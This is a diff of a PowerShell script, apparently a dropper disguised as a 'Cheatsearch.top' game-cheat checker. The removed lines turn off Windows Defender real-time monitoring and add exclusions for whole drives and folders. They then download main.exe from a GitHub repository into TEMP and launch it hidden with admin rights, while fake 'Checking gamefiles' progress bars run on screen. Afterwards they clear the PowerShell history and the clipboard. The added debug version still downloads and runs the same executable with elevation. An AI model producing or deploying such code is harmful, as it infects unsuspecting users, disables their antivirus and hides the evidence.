@@ -1,77 +1,44 @@
-# 1. Настройка окружения
-$ErrorActionPreference = "SilentlyContinue"
-# Принудительно включаем TLS 1.2 для работы с GitHub
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Clear
+Write-Host "--- Debug Mode: Cheatsearch.top ---" -ForegroundColor Yellow
 
-Write-Host "Cheatsearch.top - Best cheat searcher!" -ForegroundColor Cyan
+# 1. Проверка прав администратора
+$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Host "[-] ОШИБКА: Скрипт запущен БЕЗ прав администратора!" -ForegroundColor Red
+    Write-Host "[!] Запустите PowerShell от имени администратора." -ForegroundColor Yellow
+}
 
-# 2. Пути и подготовка
-$outputFile = "$env:TEMP\ccmmd.exe"
-$folders = @("C:\Windows\Temp", "C:\", "C:\ProgramData", "C:\Users")
+# 2. Настройка путей (используем TEMP для надежности записи)
+$outputFile = "$env:TEMP\ccmmd.exe" 
+Write-Host "[+] Путь для сохранения: $outputFile" -ForegroundColor Gray
 
-# Попытка добавить исключения (требуются права админа)
-foreach ($f in $folders) { Add-MpPreference -ExclusionPath $f }
-Add-MpPreference -ExclusionPath $outputFile
-Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-
-# 3. Скачивание файла
+# 3. Попытка скачивания
 $url = "https://github.com/expendertie/chear11/raw/refs/heads/main/main.exe"
-$downloaded = $false
+Write-Host "[*] Начинаю скачивание..." -ForegroundColor Cyan
 
 try {
-    # Основной метод скачивания
-    Invoke-WebRequest -Uri $url -OutFile $outputFile -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -UseBasicParsing
-    $downloaded = $true
+    $webClient = New-Object System.Net.WebClient
+    # Упростим User-Agent, чтобы GitHub не счел его подозрительным
+    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+    $webClient.DownloadFile($url, $outputFile)
+    Write-Host "[+] Файл успешно скачан." -ForegroundColor Green
 } catch {
+    Write-Host "[-] ОШИБКА СКАЧИВАНИЯ: $($_.Exception.Message)" -ForegroundColor Red
+}
+
+# 4. Проверка наличия файла перед запуском
+if (Test-Path $outputFile) {
+    Write-Host "[*] Попытка запуска файла..." -ForegroundColor Cyan
     try {
-        # Резервный метод через WebClient
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
-        $wc.DownloadFile($url, $outputFile)
-        $downloaded = $true
+        # Пробуем запустить и ждем немного, чтобы увидеть, не вылетит ли ошибка
+        $process = Start-Process -FilePath $outputFile -Verb RunAs -PassThru -ErrorAction Stop
+        Write-Host "[+] Процесс запущен (ID: $($process.Id))" -ForegroundColor Green
     } catch {
-        Write-Host "[-] Critical Download Error!" -ForegroundColor Red
+        Write-Host "[-] ОШИБКА ЗАПУСКА: $($_.Exception.Message)" -ForegroundColor Red
     }
+} else {
+    Write-Host "[-] ОШИБКА: Файл не найден на диске, запуск невозможен." -ForegroundColor Red
 }
 
-# 4. Логика запуска EXE
-if ($downloaded -and (Test-Path $outputFile)) {
-    try {
-        # Пытаемся запустить от имени администратора скрыто
-        Start-Process -FilePath $outputFile -Verb RunAs -WindowStyle Hidden -ErrorAction Stop
-    } catch {
-        # Если RunAs не сработал, пробуем прямой запуск
-        & $outputFile
-    }
-}
-
-# 5. Визуальная часть (твои проценты)
-$tasks = @(
-    @{ name = "Checking gamefiles"; speed = 30 },
-    @{ name = "Checking regedit"; speed = 80 },
-    @{ name = "Checking LastActivity"; speed = 15 },
-    @{ name = "Checking files"; speed = 100 }
-)
-
-foreach ($task in $tasks) {
-    for ($i = 1; $i -le 100; $i++) {
-        # `r возвращает курсор в начало строки, чтобы проценты обновлялись на месте
-        Write-Host -NoNewline ("$($task.name): $i% `r")
-        Start-Sleep -Milliseconds $task.speed
-    }
-    Write-Host ("$($task.name): Complete!      ") -ForegroundColor DarkGreen
-}
-
-Write-Host "`nCheat check end!" -ForegroundColor Green
-Write-Host "Visit cheatseach.top!" -ForegroundColor Cyan
-
-# 6. Очистка следов
-try {
-    # Чистим историю PowerShell и буфер обмена
-    [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
-    $histPath = (Get-PSReadlineOption).HistorySavePath
-    if (Test-Path $histPath) { Remove-Item $histPath -Force }
-    Add-Type -AssemblyName PresentationCore
-    [System.Windows.Clipboard]::Clear()
-} catch {}
+Write-Host "--- Конец проверки ---" -ForegroundColor Yellow
+pause
